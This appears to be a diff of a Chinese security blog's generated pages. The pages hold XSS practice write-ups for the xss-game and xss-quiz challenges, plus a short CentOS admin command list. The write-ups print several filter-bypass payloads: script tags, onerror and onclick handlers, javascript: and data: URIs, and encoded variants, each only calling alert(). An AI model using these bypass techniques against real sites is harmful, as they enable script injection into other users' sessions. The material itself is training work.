@@ -112,47 +112,33 @@
                 
                 <h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>xss太好玩了，刷题刷题~</p>
 <h2 id="level-1-easypass"><a href="#level-1-easypass" class="headerlink" title="level 1 easypass"></a>level 1 easypass</h2><p>地址：<a href="https://xss-game.appspot.com/level1" target="_blank" rel="noopener">https://xss-game.appspot.com/level1</a><br>easy</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/alert&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="level-2-img标签-事件绕过"><a href="#level-2-img标签-事件绕过" class="headerlink" title="level 2 img标签+事件绕过"></a>level 2 img标签+事件绕过</h2><p>地址：<a href="https://xss-game.appspot.com/level2" target="_blank" rel="noopener">https://xss-game.appspot.com/level2</a></p>
+<pre><code>&lt;script&gt;alert(1)&lt;/alert&gt;</code></pre><h2 id="level-2-img标签-事件绕过"><a href="#level-2-img标签-事件绕过" class="headerlink" title="level 2 img标签+事件绕过"></a>level 2 img标签+事件绕过</h2><p>地址：<a href="https://xss-game.appspot.com/level2" target="_blank" rel="noopener">https://xss-game.appspot.com/level2</a></p>
 <p>过滤script标签，用事件绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="level-3-window-location-hash"><a href="#level-3-window-location-hash" class="headerlink" title="level 3 window.location.hash"></a>level 3 window.location.hash</h2><p>地址：<a href="https://xss-game.appspot.com/level3" target="_blank" rel="noopener">https://xss-game.appspot.com/level3</a></p>
+<pre><code>&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</code></pre><h2 id="level-3-window-location-hash"><a href="#level-3-window-location-hash" class="headerlink" title="level 3 window.location.hash"></a>level 3 window.location.hash</h2><p>地址：<a href="https://xss-game.appspot.com/level3" target="_blank" rel="noopener">https://xss-game.appspot.com/level3</a></p>
 <p><img src="https://s1.ax1x.com/2018/08/04/PBXJRU.jpg" alt><br>看到url里，有“#”号，联想window.location.hash<br>那么什么是window.location.hash呢?</p>
 <p><a href="https://www.cnblogs.com/china-aspx/archive/2008/04/20/1162597.html" target="_blank" rel="noopener">window.location.hash属性介绍</a><br>location是javascript里边管理地址栏的内置对象，比如location.href就管理页面的url，用location.href=url就可以直接将页面重定向url。而location.hash则可以用来获取或设置页面的标签值。比如<a href="http://domain/#admin的location.hash=&quot;#admin&quot;。利用这个属性值可以做一个非常有意义的事情。" target="_blank" rel="noopener">http://domain/#admin的location.hash=&quot;#admin&quot;。利用这个属性值可以做一个非常有意义的事情。</a></p>
 <p>也就是说页面会截取#后面的内容，再将这个值替换到url里进行重定向，这里提交一句话分析一下</p>
 <p><img src="https://s1.ax1x.com/2018/08/04/PBXYzF.png" alt><br>如果我们以单引号结尾，我们猜测这个页面会截取单引号前面的内容并把它闭合到src的双引号里。并且在后面的jpg后再追加一个单引号。既然能脱离单引号，一切都好办了，我们用on事件构造：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4&apos; onerror=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>
-
-<p>成功弹框</p>
+<pre><code>4&#39; onerror=&quot;alert(1)&quot;</code></pre><p>成功弹框</p>
 <h2 id="level4-编码绕过"><a href="#level4-编码绕过" class="headerlink" title="level4 编码绕过"></a>level4 编码绕过</h2><p>地址：<a href="https://xss-game.appspot.com/level4" target="_blank" rel="noopener">https://xss-game.appspot.com/level4</a></p>
 <p>题目给了一个自己写的js函数叫做startime，执行时会进行相应的延时<br>函数的闭合如图:<br><img src="https://s1.ax1x.com/2018/08/04/PBXNM4.png" alt></p>
 <p>思路是在onload事件里构造语句，出现弹框，但是过滤了分号，那么我们可以用URL编码来代替分号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;)%3Balert(&apos;1</span><br></pre></td></tr></table></figure>
-
-<p>还有两种思路：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;) || alert(&apos;1</span><br></pre></td></tr></table></figure>
-
-<p>也可以用下面这种方法，不需要任何编码/操作符：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;);alert(1);//</span><br></pre></td></tr></table></figure>
-
-<p>我尝试用html编码绕，但是过滤了&amp;和#</p>
+<pre><code>1&#39;)%3Balert(&#39;1</code></pre><p>还有两种思路：</p>
+<pre><code>1&#39;) || alert(&#39;1</code></pre><p>也可以用下面这种方法，不需要任何编码/操作符：</p>
+<pre><code>1&#39;);alert(1);//</code></pre><p>我尝试用html编码绕，但是过滤了&amp;和#</p>
 <h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>地址：<a href="https://xss-game.appspot.com/level5" target="_blank" rel="noopener">https://xss-game.appspot.com/level5</a></p>
 <p>这题看提示，注意singup页面的url<br><img src="https://s1.ax1x.com/2018/08/04/PBXaL9.jpg" alt></p>
 <p>singup页面还看到了next按钮，查看元素发现：<br><img src="https://s1.ax1x.com/2018/08/04/PBXUsJ.png" alt><br>奥，事情不简单，我们传入一个next值，然后重定向给href属性。果断用javascript伪协议<br>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?next=javascript:alert(1)</span><br></pre></td></tr></table></figure>
-
-<p>弹框~</p>
+<pre><code>?next=javascript:alert(1)</code></pre><p>弹框~</p>
 <h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>地址：<a href="https://xss-game.appspot.com/level6" target="_blank" rel="noopener">https://xss-game.appspot.com/level6</a></p>
 <p>这题会截取#以后的内容，加载到一个新的script标签里的src属性内。我认为是引入一个js脚本的意思。如图<br><img src="https://s1.ax1x.com/2018/08/04/PBXwZR.png" alt></p>
 <p>这里利用DATA URI Scheme来执行js代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss-game.appspot.com/level6/frame#data:text/javascript,alert(1);</span><br></pre></td></tr></table></figure>
+<pre><code>http://xss-game.appspot.com/level6/frame#data:text/javascript,alert(1);</code></pre>
                 
             </div>
             <div class="continue">
             <a href="/2018/08/06/xss从零开始（三）之怒刷google-xss/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -181,76 +167,49 @@
                 
                 <h2 id="刷题"><a href="#刷题" class="headerlink" title="刷题"></a>刷题</h2><p>话不多说，刷题，平台：<a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">xss-quiz</a></p>
 <h2 id="chanllenge1"><a href="#chanllenge1" class="headerlink" title="chanllenge1"></a>chanllenge1</h2><p>直接丢payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>document.domain 弹出当前网页的网址</p>
+<pre><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre><p>document.domain 弹出当前网页的网址</p>
 <h2 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h2><p>随便查一个语句看一下浏览器是怎么渲染的<br><img src="https://s1.ax1x.com/2018/08/02/P02C5t.png" alt><br>查询的东西嵌在input标签里的value属性里，解析不到script标签不会调用Js，构造一下bypass逃逸input标签。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;value=&quot;12</span><br></pre></td></tr></table></figure>
-
-<h2 id="challenge3-其它input框的xss"><a href="#challenge3-其它input框的xss" class="headerlink" title="challenge3 其它input框的xss"></a>challenge3 其它input框的xss</h2><p><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=1d3a326683f074388b7728dca060b78a14f0e9ec" target="_blank" rel="noopener">题目地址</a></p>
+<pre><code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;value=&quot;12</code></pre><h2 id="challenge3-其它input框的xss"><a href="#challenge3-其它input框的xss" class="headerlink" title="challenge3 其它input框的xss"></a>challenge3 其它input框的xss</h2><p><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=1d3a326683f074388b7728dca060b78a14f0e9ec" target="_blank" rel="noopener">题目地址</a></p>
 <p>普通构造，右键源码发现把尖括号实体化编码了。<br><img src="https://s1.ax1x.com/2018/08/02/P02ebj.png" alt><br>用编码没绕过去，p2选择出存在xss无过滤，改一下参数为构造语句再提交<br><img src="https://s1.ax1x.com/2018/08/02/P02ZrQ.md.jpg" alt></p>
 <h2 id="challenge4-隐藏input框"><a href="#challenge4-隐藏input框" class="headerlink" title="challenge4 隐藏input框"></a>challenge4 隐藏input框</h2><p><a href="http://xss-quiz.int21h.jp/stage_4.php?sid=33be43b49a6aea5be5c026a7237d7b4f02c0ad5d" target="_blank" rel="noopener">题目地址</a></p>
 <p>隐藏有个p3输入框，type从hidden改为test，构造payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;value=&quot;</span><br></pre></td></tr></table></figure>
-
-<h2 id="challenge5-长度限制"><a href="#challenge5-长度限制" class="headerlink" title="challenge5 长度限制"></a>challenge5 长度限制</h2><p><a href="http://xss-quiz.int21h.jp/stage--5.php?sid=d4eb6de1a6a0e9bd47b5926e4f8565b2050c5bf1" target="_blank" rel="noopener">题目地址</a></p>
+<pre><code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;value=&quot;</code></pre><h2 id="challenge5-长度限制"><a href="#challenge5-长度限制" class="headerlink" title="challenge5 长度限制"></a>challenge5 长度限制</h2><p><a href="http://xss-quiz.int21h.jp/stage--5.php?sid=d4eb6de1a6a0e9bd47b5926e4f8565b2050c5bf1" target="_blank" rel="noopener">题目地址</a></p>
 <p>长度限制改一下就行了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;value=&quot;</span><br></pre></td></tr></table></figure>
-
-<h2 id="challenge6-on事件bypass尖括号"><a href="#challenge6-on事件bypass尖括号" class="headerlink" title="challenge6 on事件bypass尖括号"></a>challenge6 on事件bypass尖括号</h2><p><a href="http://xss-quiz.int21h.jp/stage-no6.php?sid=6509f715d2192b584b19d2b5e5bd1bc6717762fc" target="_blank" rel="noopener">题目地址</a></p>
+<pre><code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;value=&quot;</code></pre><h2 id="challenge6-on事件bypass尖括号"><a href="#challenge6-on事件bypass尖括号" class="headerlink" title="challenge6 on事件bypass尖括号"></a>challenge6 on事件bypass尖括号</h2><p><a href="http://xss-quiz.int21h.jp/stage-no6.php?sid=6509f715d2192b584b19d2b5e5bd1bc6717762fc" target="_blank" rel="noopener">题目地址</a></p>
 <p>过滤了尖括号，用其它事件绕过去，注意查看元素构造Payload:</p>
 <p>鼠标向上移动触发js事件：<code>&quot;onmouseover=&quot;alert(document.domain)&quot;</code>,onmouseover要脱离引号，alert在引号内。</p>
 <p>鼠标点击触发js事件：<code>&quot;onclick=&quot;alert(document.domain)&quot;</code></p>
 <p>事件会在页面或图像加载完成后立即发生:<code>onload=&quot;alert(document.domain)&quot;</code></p>
 <h2 id="challenge7-过滤尖括号和双引号和-amp"><a href="#challenge7-过滤尖括号和双引号和-amp" class="headerlink" title="challenge7 过滤尖括号和双引号和&amp;"></a>challenge7 过滤尖括号和双引号和&amp;</h2><p><a href="http://xss-quiz.int21h.jp/stage07.php?sid=15c647c2238f650c9f950d9639a4df17c21005b8" target="_blank" rel="noopener">题目地址</a></p>
 <p>经测试，输入空格会自动把前面补一个双引号，然后自己多构造一下找规律就行<br>bypass</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a onclick=alert(document.domain)</span><br></pre></td></tr></table></figure>
-
-<h2 id="challenge8-javascript伪协议"><a href="#challenge8-javascript伪协议" class="headerlink" title="challenge8 javascript伪协议"></a>challenge8 javascript伪协议</h2><p>从网上学习到：看到输出是在href属性下，用javascript伪协议</p>
+<pre><code>a onclick=alert(document.domain)</code></pre><h2 id="challenge8-javascript伪协议"><a href="#challenge8-javascript伪协议" class="headerlink" title="challenge8 javascript伪协议"></a>challenge8 javascript伪协议</h2><p>从网上学习到：看到输出是在href属性下，用javascript伪协议</p>
 <p>常见用到伪协议的属性如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">href</span><br><span class="line">backgroud</span><br></pre></td></tr></table></figure>
-
-<p>学了一波javascript伪协议，看到离歌师傅有一篇文章写的javascript伪协议与url编码联合bypass的文章，感叹还有这种姿势，但是这个道题应该用不到编码，但是我尝试了一下javascript伪协议确实会把“符号”变为“字符串”，从而使用编码，具体看师傅的文章：<br><a href="https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html" target="_blank" rel="noopener">利用location来变形我们的XSS Payload</a></p>
+<pre><code>src
+href
+backgroud</code></pre><p>学了一波javascript伪协议，看到离歌师傅有一篇文章写的javascript伪协议与url编码联合bypass的文章，感叹还有这种姿势，但是这个道题应该用不到编码，但是我尝试了一下javascript伪协议确实会把“符号”变为“字符串”，从而使用编码，具体看师傅的文章：<br><a href="https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html" target="_blank" rel="noopener">利用location来变形我们的XSS Payload</a></p>
 <p>bypass:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.domain);</span><br></pre></td></tr></table></figure>
-
-<p>等价的bypass</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert%28document.domain%29;</span><br></pre></td></tr></table></figure>
-
-<h2 id="challenge9"><a href="#challenge9" class="headerlink" title="challenge9"></a>challenge9</h2><p>utf-7编码，看到网上说有问题，直接跳过</p>
+<pre><code>javascript:alert(document.domain);</code></pre><p>等价的bypass</p>
+<pre><code>javascript:alert%28document.domain%29;</code></pre><h2 id="challenge9"><a href="#challenge9" class="headerlink" title="challenge9"></a>challenge9</h2><p>utf-7编码，看到网上说有问题，直接跳过</p>
 <h2 id="challenge10-过滤特定字符"><a href="#challenge10-过滤特定字符" class="headerlink" title="challenge10 过滤特定字符"></a>challenge10 过滤特定字符</h2><p><a href="http://xss-quiz.int21h.jp/stage00010.php?sid=6fa5bf6c0c7288222210ed0d77f851739e00f7e5" target="_blank" rel="noopener">题目地址</a></p>
 <p>过滤了domain，构造出来domain</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domdomainain)&lt;/script&gt;&quot;&lt;value=&quot;</span><br></pre></td></tr></table></figure>
-
-<h2 id="challenge11-编码绕过"><a href="#challenge11-编码绕过" class="headerlink" title="challenge11 编码绕过"></a>challenge11 编码绕过</h2><p>题目地址(<a href="http://xss-quiz.int21h.jp/stage11th.php?sid=ac29e65dc2666674f15adbe46a2c4af6397173ff" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage11th.php?sid=ac29e65dc2666674f15adbe46a2c4af6397173ff</a>)</p>
+<pre><code>&quot;&gt;&lt;script&gt;alert(document.domdomainain)&lt;/script&gt;&quot;&lt;value=&quot;</code></pre><h2 id="challenge11-编码绕过"><a href="#challenge11-编码绕过" class="headerlink" title="challenge11 编码绕过"></a>challenge11 编码绕过</h2><p>题目地址(<a href="http://xss-quiz.int21h.jp/stage11th.php?sid=ac29e65dc2666674f15adbe46a2c4af6397173ff" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage11th.php?sid=ac29e65dc2666674f15adbe46a2c4af6397173ff</a>)</p>
 <p>这题过滤很多：<br>1，script会被替换为xscript　</p>
 <p>2，on事件会被替换为onxxx</p>
 <p>3，style会被替换为stxxx</p>
 <p>想用html编码绕过构造script标签，结果如下：<br><img src="https://s1.ax1x.com/2018/08/03/PBNnnf.png" alt><br>后来测试发现，浏览器再解析xml时，先把标签解析成DOM树，而在标签名解析的时候不会解释html编码。解析成DOM树后，html编码解析只对<br>标签里面<strong>属性的值</strong>进行解码的。</p>
 <p>例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a text=&quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-
-<p>会被解析为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a text=&quot;script&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-
-<p>但是脱离属性外的值不会被解码，例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a text=&quot;abc&quot; &quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-
-<p>还是会被解析成</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a text=&quot;abc&quot; &quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-
-<p>所以我们构造script标签的思路行不通，那我们可以用html编码构造事件，但是构造事件又会脱离“属性”这个范围，编码不会被解析。那我们就重新构造标签，利用href属性和Javascript伪协议<br>bypass</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascr&amp;#105;pt:alert(document.domain)&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="challenge12"><a href="#challenge12" class="headerlink" title="challenge12"></a>challenge12</h2><p>过滤了&lt;&gt;和双引号，绕不过去双引号闭合，我们用html编码构造的双引号会被认为成“字符串型”的引号，而不是“符号”，所以不能逃逸出来，看到网上wp说用`可以代替引号，前提是IE8浏览器才能这么解释，这里没什么实战意义，就不做了</p>
+<pre><code>&lt;a text=&quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt;</code></pre><p>会被解析为：</p>
+<pre><code>&lt;a text=&quot;script&quot;&gt;&lt;/a&gt;</code></pre><p>但是脱离属性外的值不会被解码，例如：</p>
+<pre><code>&lt;a text=&quot;abc&quot; &quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt;</code></pre><p>还是会被解析成</p>
+<pre><code>&lt;a text=&quot;abc&quot; &quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt;</code></pre><p>所以我们构造script标签的思路行不通，那我们可以用html编码构造事件，但是构造事件又会脱离“属性”这个范围，编码不会被解析。那我们就重新构造标签，利用href属性和Javascript伪协议<br>bypass</p>
+<pre><code>&quot;&gt;&lt;a href=javascr&amp;#105;pt:alert(document.domain)&gt;xss&lt;/a&gt;</code></pre><h2 id="challenge12"><a href="#challenge12" class="headerlink" title="challenge12"></a>challenge12</h2><p>过滤了&lt;&gt;和双引号，绕不过去双引号闭合，我们用html编码构造的双引号会被认为成“字符串型”的引号，而不是“符号”，所以不能逃逸出来，看到网上wp说用`可以代替引号，前提是IE8浏览器才能这么解释，这里没什么实战意义，就不做了</p>
 <h2 id="challenge15-document-write"><a href="#challenge15-document-write" class="headerlink" title="challenge15 document.write()"></a>challenge15 document.write()</h2><p><a href="http://xss-quiz.int21h.jp/stage__15.php?sid=0e9fcc768b680fc1b76007d10e36ea7d68d79dfd" target="_blank" rel="noopener">题目地址</a></p>
 <p>这题过滤了尖括号，双引号，但在input标签之上引用了document.write的方法，那么什么是document.write方法呢？</p>
 <p>w3c里是这样定义的：<br>write() 方法可向文档写入 HTML 表达式或 JavaScript 代码。<br>可列出多个参数(exp1,exp2,exp3,…) ，它们将按顺序被追加到文档中。</p>
 <p>也就是说我们在write一下插入的代码就是js范畴了，\u + Unicode编码这种形式是js的编码方法，所以会被解释为&lt;，但是document.write在输出的时候会JavascriptDecode一下数据，会把数据原有\去除，即php里面的stripslashes。</p>
 <p>因此我们要用\来替代\，payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</span><br><span class="line">\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</span><br></pre></td></tr></table></figure>
-
-<p>一种是unicode编码，一种是\x + 16进制，都可以绕过</p>
+<pre><code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
+\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</code></pre><p>一种是unicode编码，一种是\x + 16进制，都可以绕过</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>剩下的题目有些环境严苛不做研究。总结一下，能调用js的方式：一些on事件，如:onmouseover、onclick、onerror等等。或者script标签，如果是标签的话，要脱离其它标签才能开启js解析调用。还有就是一些特定的方法，现在接触到的只有一个document.write。</p>
 <p>学会构造、学会用javascript伪协议，学会编码绕过，知道浏览器解析的顺序，that’s important~</p>
 
@@ -258,7 +217,7 @@
             </div>
             <div class="continue">
             <a href="/2018/08/02/xss从零开始（二）之怒刷xss-quiz/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -298,9 +257,7 @@
 <h3 id="Input标签"><a href="#Input标签" class="headerlink" title="Input标签"></a>Input标签</h3><p>输入标签，定义class可以选择demo，type规定输入类型，记得标记id</p>
 <h3 id="button标签"><a href="#button标签" class="headerlink" title="button标签"></a>button标签</h3><p>字如其名，按钮作用</p>
 <h3 id="document-querySelector"><a href="#document-querySelector" class="headerlink" title="document.querySelector"></a>document.querySelector</h3><p>获取文档中 id=”demo” 的元素：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.querySelector(&quot;#demo&quot;);</span><br></pre></td></tr></table></figure>
-
-<h3 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h3><p>innerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML。</p>
+<pre><code>document.querySelector(&quot;#demo&quot;);</code></pre><h3 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h3><p>innerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML。</p>
 <p>这里就是在span标签之间插入value</p>
 <h2 id="xss测试"><a href="#xss测试" class="headerlink" title="xss测试"></a>xss测试</h2><p>我们插一个Script看是否会弹框<br><img src="https://s1.ax1x.com/2018/08/01/Pw4KRx.png" alt></p>
 <p>没有弹框，看一下script的位置，原因如下：</p>
@@ -310,7 +267,7 @@
             </div>
             <div class="continue">
             <a href="/2018/08/01/xss从零开始（一）/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -338,46 +295,21 @@
             <div class="content">
                 
                 <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>参加了一个小组内的awd，体验感极差，上来被人抓着phpmyadmin改了密码，无限被check，非root用户我不会改mysql密码（其实当时是没意识到），在查linux文件、编辑、复制过程中一度出现命令忘记。。在这篇持续记录一下自己使用的centos7的命令吧。。</p>
-<h2 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h2><h3 id="查看自己的用户名"><a href="#查看自己的用户名" class="headerlink" title="查看自己的用户名"></a>查看自己的用户名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>
-
-<h3 id="增加一个test组"><a href="#增加一个test组" class="headerlink" title="增加一个test组"></a>增加一个test组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd test</span><br></pre></td></tr></table></figure>
-
-<h3 id="删除一个test组"><a href="#删除一个test组" class="headerlink" title="删除一个test组"></a>删除一个test组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupdel test2</span><br></pre></td></tr></table></figure>
-
-<h3 id="查看当前用户所在的组"><a href="#查看当前用户所在的组" class="headerlink" title="查看当前用户所在的组"></a>查看当前用户所在的组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gours</span><br></pre></td></tr></table></figure>
-
-<h3 id="查看所有组"><a href="#查看所有组" class="headerlink" title="查看所有组"></a>查看所有组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/group</span><br></pre></td></tr></table></figure>
-
-<h3 id="添加用户（参考帮助文档进行用户配置）"><a href="#添加用户（参考帮助文档进行用户配置）" class="headerlink" title="添加用户（参考帮助文档进行用户配置）"></a>添加用户（参考帮助文档进行用户配置）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -g test -m  hpdoger #添加hpdoger到test组并创建用户目录（要先创建test组）</span><br></pre></td></tr></table></figure>
-
-<p>具体参考 useradd -help<br><img src="https://upload-images.jianshu.io/upload_images/4830242-12d60abd2b9259e6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/660" alt></p>
+<h2 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h2><h3 id="查看自己的用户名"><a href="#查看自己的用户名" class="headerlink" title="查看自己的用户名"></a>查看自己的用户名</h3><pre><code>whoami</code></pre><h3 id="增加一个test组"><a href="#增加一个test组" class="headerlink" title="增加一个test组"></a>增加一个test组</h3><pre><code>groupadd test</code></pre><h3 id="删除一个test组"><a href="#删除一个test组" class="headerlink" title="删除一个test组"></a>删除一个test组</h3><pre><code>groupdel test2</code></pre><h3 id="查看当前用户所在的组"><a href="#查看当前用户所在的组" class="headerlink" title="查看当前用户所在的组"></a>查看当前用户所在的组</h3><pre><code>gours</code></pre><h3 id="查看所有组"><a href="#查看所有组" class="headerlink" title="查看所有组"></a>查看所有组</h3><pre><code>cat /etc/group</code></pre><h3 id="添加用户（参考帮助文档进行用户配置）"><a href="#添加用户（参考帮助文档进行用户配置）" class="headerlink" title="添加用户（参考帮助文档进行用户配置）"></a>添加用户（参考帮助文档进行用户配置）</h3><pre><code>useradd -g test -m  hpdoger #添加hpdoger到test组并创建用户目录（要先创建test组）</code></pre><p>具体参考 useradd -help<br><img src="https://upload-images.jianshu.io/upload_images/4830242-12d60abd2b9259e6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/660" alt></p>
 <p>若想创建不能登陆的用户</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -g test2 -M -s /sbin/nologin hpdoger #添加hpdoger到test组不创建用户目录，并且不可用于登录</span><br></pre></td></tr></table></figure>
-
-<h3 id="修改hpdoger用户密码"><a href="#修改hpdoger用户密码" class="headerlink" title="修改hpdoger用户密码"></a>修改hpdoger用户密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd hpdoger</span><br></pre></td></tr></table></figure>
-
-<p><strong>切记，创建完用户要修改密码，否则用户不能登陆</strong></p>
+<pre><code>useradd -g test2 -M -s /sbin/nologin hpdoger #添加hpdoger到test组不创建用户目录，并且不可用于登录</code></pre><h3 id="修改hpdoger用户密码"><a href="#修改hpdoger用户密码" class="headerlink" title="修改hpdoger用户密码"></a>修改hpdoger用户密码</h3><pre><code>passwd hpdoger</code></pre><p><strong>切记，创建完用户要修改密码，否则用户不能登陆</strong></p>
 <h3 id="普通账号与root的切换"><a href="#普通账号与root的切换" class="headerlink" title="普通账号与root的切换"></a>普通账号与root的切换</h3><p><strong>root</strong>切换为<strong>普通</strong>: <code>login -f hpdoger</code><br><strong>普通</strong>切换成<strong>root</strong>权限: <code>su # 然后输入密码</code></p>
 <h2 id="端口类命令"><a href="#端口类命令" class="headerlink" title="端口类命令"></a>端口类命令</h2><h3 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h3><p>我的centos7把firewall给ban了，那么查看端口的命令我用的是这个：<br><code>[root@vultr ~]# netstat -lnp</code></p>
